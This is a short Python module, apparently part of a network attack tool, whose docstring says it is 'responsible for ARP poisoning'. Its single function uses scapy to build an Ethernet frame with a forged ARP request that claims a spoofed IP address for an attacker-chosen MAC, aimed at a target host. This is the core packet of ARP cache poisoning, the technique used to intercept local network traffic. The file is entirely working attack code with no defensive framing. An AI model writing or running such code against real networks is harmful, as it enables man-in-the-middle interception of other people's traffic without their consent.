"""This module is responsible for ARP poisoning."""

from scapy.layers.l2 import ARP, Ether, Packet


def create_arppoison_packet(
    target_mac: str, target_ip: str, spoofed_ip: str, attacker_mac: str | None = None
) -> Packet:
    """Create ARP packet.

    Args:
        target_mac (str): MAC address of the target
        target_ip (str): IP address of the target
        spoofed_ip (str): IP address of the spoofed IP address
    Returns:
        Ether: ARP packet"""
    ether_opts: dict = {"src": attacker_mac} if attacker_mac else {}
    return Ether(dst=target_mac, **ether_opts) / ARP(
        op="who-has", psrc=spoofed_ip, pdst=target_ip
    )
